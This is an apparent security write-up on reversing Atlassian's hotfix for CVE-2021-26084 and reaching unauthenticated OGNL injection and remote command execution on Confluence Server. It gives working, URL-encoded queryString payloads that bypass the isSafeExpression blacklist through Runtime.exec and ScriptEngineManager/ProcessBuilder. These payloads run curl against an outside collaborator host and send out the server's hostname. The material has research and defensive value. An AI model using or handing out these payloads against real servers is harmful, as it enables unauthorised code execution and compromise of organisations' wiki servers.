# CVE-2021-26084 Remote Code Execution on Confluence Servers

We got this vulnerability in our Twitter feed via Matthias's tweet:

![image](https://user-images.githubusercontent.com/21000421/131542083-745bf6f8-0aa3-4ebb-bece-2acd29f513f5.png)

This looked like a great target for bug bounties as such we started to reverse the patch. So we reversed it and poped a shell.

![image](https://user-images.githubusercontent.com/21000421/131575489-28c2fcdc-152c-454a-bd8b-8de2a468a64b.png)


## Analyzing the hot patch

Generally, you’d do a diff between patched and unpatched versions to look for changed files but in this case, Atlassian made it easier by providing a shell script that patched the installation.

While going through the advisory we found that a [hotfix](https://confluence.atlassian.com/doc/files/1077906215/1077916296/2/1629936383093/cve-2021-26084-update.sh) was released by Atlassian for this CVE.

Looking at the shell script it was clear that there were a few `*.vm` files that were modified with a bit of string match and replace which implied the vulnerability should lie somewhere inside them.

We quickly grabbed the unpatched version (7.12.4) of Confluence Server, unzipped and to be just sure that we understood the patch correctly, we created a copy of the confluence server and applied the patch script on that copy.

From the output of the script it was clear that only 3 files were changed for us so we started to look at the first file that was changed, i.e., `<confluence_dir>/confluence/pages/createpage-entervariables.vm`

![image](https://user-images.githubusercontent.com/21000421/131542762-e220453c-dce9-4c52-aef1-d33a84b79fb8.png)

Next, step was to find the routing of these files which came out to be quite straightforward. We did a recursive grep for **createpage-entervariables.vm** and we found this file **xwork.xml** which seems to contain url patterns (routes) along with the Classes (and methods) where actual implementation exists.

![image](https://user-images.githubusercontent.com/21000421/131544022-73a5f050-64b6-47e8-8915-5a7913d49ceb.png)

Here, the value of `name` attribute of an action element corresponds to a path `/<nameValue>.action` and the <result> element contains which template would be rendered as a part of response based on error/success etc.

So for example, simply visiting `/pages/doenterpagevariables.action` should render the velocity template file which was modified i.e. `createpage-entervariables.vm`. Remember that any route that renders this template would cause the vulnerability exist completely unauth regardless of you turning on Sign up feature.

![image](https://user-images.githubusercontent.com/21000421/131544118-1799d287-c950-4a3e-a7d4-3c5c53a88619.png)
  
We can see how the velocity template was rendered into an HTML page

![image](https://user-images.githubusercontent.com/21000421/131544144-7e62ba3e-29c2-4ec2-907e-26106dd41785.png)

Instead of directly jumping into the code, we took a blackbox approach and tried input tags name in the template as the parameters and found that the values were actually taken from request parameters and reflected back in the response.

```
    #tag ("Hidden" "name='queryString'" "value='$!queryString'")
...
    #tag ("Hidden" "name='linkCreation'" "value='$linkCreation")
```

Following this change from the hotfix, We added a random parameter in the request and we found that it was echoed in the place of `$!queryString`

As we were not familiar with OGNL or Template injection in Velocity before this, we just gave it a shot directly with `#{} %{} ${}` like expressions etc. but neither seemed to work and they echoed in the page as it is.

Then, we thought of trying `queryString` itself as a parameter name and to our surprise it actually worked and the value was again reflected in the `queryString` input tag. But again no dice with expression evaluation.

We tried breaking out quotes and then evaluating expressions like `'+#{3*33}+'` but neither worked.

After playing with `queryString` a little bit, one thing that caught our attention - Upon adding a backslash `\` , the value attribute of the `queryString` input didn't render this time altogether. It seemed like either we were able to break out of the context or there are some kind of escape sequences being rendered. When putting `queryString=\\` we found this time the value appeared as `\` which means it was the latter.

Tried a hex escape sequence like `\x2f` but the value didn’t get rendered again, putting `\\x2f` gave us `\x2f` in the response, we then tried unicode escape sequences, `\u002f` and yes they got normalized to the actual value i.e. `\`.

So, knowing from the velocity template that the input lies inside single quotes, we tried to break it this time with `\u0027` and our suspicion got stronger when the value attribute didn’t get reflected again. Trying again with \u0022 however just gave us `value="&quot;”`

After this it was just about balancing the quotes,  `queryString=aaaa\u0027%2b\u0027bbb` and as expected this time the value attribute came out to be `value="aaaabbb"` which means the context was broken and our input was concatenated.

Next, simply concating it with an OGNL expression like `#{3*333}` , i.e., `queryString=aaaa\u0027%2b#{3*333}%2b\u0027bbb` and here's our unauth OGNL expression evaluation :)
  
![image](https://user-images.githubusercontent.com/21000421/131546841-11b4c761-271b-4b58-bfe9-5c7ca2246900.png)

## Bypassing isSafeExpression

Just when we thought it was over and tried to directly execute an expression that would execute a command for us from a previous Confluence template injection. It didn't work!

Taking a step back, It was found that only a handful of variables/objects were accessible.

Example: `#{session}`, `#{attrs}`, etc. worked but we were not able to get our hands on request/response object, not even `#parameters`, neither were we able to set variables which implied there were some checks in place.

We had a look at our Confluence logs and found this

![image](https://user-images.githubusercontent.com/21000421/131547423-c457682d-e36e-4328-9e2f-1a17604e7543.png)

`isSafeExpression` method was being called before evaluating our OGNL expression which basically compiled our OGNL expression and looked if some malicious properties/methods were being called inside it.

![image](https://user-images.githubusercontent.com/21000421/131547997-4d0438ff-400a-432b-bfd7-399a4cae84c2.png)

Malicious variables, properties, node types and methods etc. are hardcoded in this static block which makes sense why #parameters #request didn’t work for us

![image](https://user-images.githubusercontent.com/21000421/131548054-0f0cd418-05cf-4a4a-9d91-339030fb5dd4.png)

Compiles OGNL Expression and calls containsUnsafeExpression(..)

![image](https://user-images.githubusercontent.com/21000421/131548159-6e601fdb-0e0a-4d7d-b960-273ac7c6317c.png)

Checks on the AST Node tree of our parsed expression for the hardcoded blacklisting

As we can see the `getClass()` method is also blacklisted Since, `"".getClass()` is the most commonly used way to get an instance of a class and perform Java reflection to execute commands.

We googled a bit and found this from [Orange](https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html) himself that we could also access `class` property using Array accessors instead of `getClass` method or `.class` property.

Payload would be - `queryString=aaa\u0027%2b#{\u0022\u0022[\u0022class\u0022]}%2b\u0027bbb`

which decodes to - `queryString=aaa'+#{""["class"]}+'bbb`

![image](https://user-images.githubusercontent.com/21000421/131548437-8fa0f088-7a59-417a-b35e-d11aa9ce97a0.png)

After that it was just as straightforward as it could be, we got an instance of `java.lang.Runtime` class, invoked `getRuntime()` and finally called the `exec` method to obtain our much needed command execution.


Payload - `queryString=aaa\u0027%2b#{\u0022\u0022[\u0022class\u0022].forName(\u0022java.lang.Runtime\u0022).getMethod(\u0022getRuntime\u0022,null).invoke(null,null).exec(\u0022curl <instance>.burpcollaborator.net\u0022)}%2b\u0027`


Which decodes to -

```
queryString=aaa'+
#{

""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")

}
+'
 ```
  
```
  #tag ( "Hidden" name="queryString" value="''+#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}+''" )
```

## Bonus - Better Payload

Though we got the code execution, there was a limitation on how the command is ran. The limitation is with `java.lang.Runtime.getRuntime().exec("String Command")` itself. Due to which we could not use redirections ( < > ) or Bash expansions like $() or `` or even operators like ;, |, &&, etc. 

To circumvant this we could have used overloaded exec method which takes array as an argument.

`java.lang.Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c", "any linux command here"})`

But unfortunately `isSafeExpression` gets triggerd with the usage of `new String[]`. We spent a good amount of time creating java arrays with the help of Reflections API but no luck with this as well.

Finally we came across this elegant solution which make use of `javax.script.ScriptEngineManager` to execute java code in javascript syntax. More on this at [Beans Validation RCE by @pwntester](https://securitylab.github.com/research/bean-validation-RCE/)

Final payload with shell features:

`queryString=aaa\u0027%2b#{\u0022\u0022[\u0022class\u0022].forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022var x=new java.lang.ProcessBuilder;x.command([\u0027/bin/bash\u0027,\u0027-c\u0027,\u0027'.$cmd.'\u0027]);x.start()\u0022)}%2b\u0027`

Which gets deocoded to -

```
queryString=aaa'+
#{

""["class"].forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var x=new java.lang.ProcessBuilder;x.command(['/bin/bash','-c','curl domain/$(hostname)']);x.start()");

}
+'
 ```

![image](https://user-images.githubusercontent.com/21000421/131549246-4c012906-80ac-481f-9c2d-42156751ce16.png)

## Bonus - Debugging

**Disclaimer - We couldn't determine where exactly the issue lies in code flow but here's our preliminary investigation**

To find how the OGNL expressions are parsed in our user input that goes inside the velocity template. We set a breakpoint on `isSafeExpression` to see how the call stack looks like.

From our understanding & debugging we came to this conclusion:

Attributes of `#tag` components within Velocity template are evaluated as OGNL Expressions to convert the template into HTML.

- render method of `AST*` & `AbstractTagDirective` classes are called which inturn calls

  - processTag method of `AbstractTagDirective`, which calls doEndTag

      - And `evaluateParams` is where all name & value attributes are individually tried to be found & eventually parsed as OGNL expressions by method `findValue()` but before that

        - `SafeExpressionUtil.isSafeExpression` is called to check for malicious expression, once expression is considered safe, OgnlValueStack.findValue(..) is called again.

        - ![image](https://user-images.githubusercontent.com/21000421/131567463-5a69c1fd-072f-4dc9-a180-6b0a5b8287da.png)

            - Finally we reach `Object o = expressions.get(expression);` inside `Ognlutil.Compile` method, here expression is our payload After this line is executed our unicode escapes in our input gets decoded and expression gets parsed again. > **This unicode decode is probably because of what Matthias [tweeted (https://twitter.com/matthias_kaiser/status/1432669762442698753) about being an [OGNL thing](https://github.com/jkuhnert/ognl/blob/master/src/etc/ognl.jjt#L48)**

            - ![image](https://user-images.githubusercontent.com/21000421/131567486-61918e11-9070-4c18-a5b9-5ccf7697f24c.png)

            - ![image](https://user-images.githubusercontent.com/21000421/131567558-9e270825-6871-4377-9f33-41753fa9d2c3.png)

              - And the call stack returns back, where it becomes the part of Writer object (and eventually part of HTML).

              - ![image](https://user-images.githubusercontent.com/21000421/131567568-a3328e2a-824d-4bce-ba8f-7db298405e45.png)

Git-tag
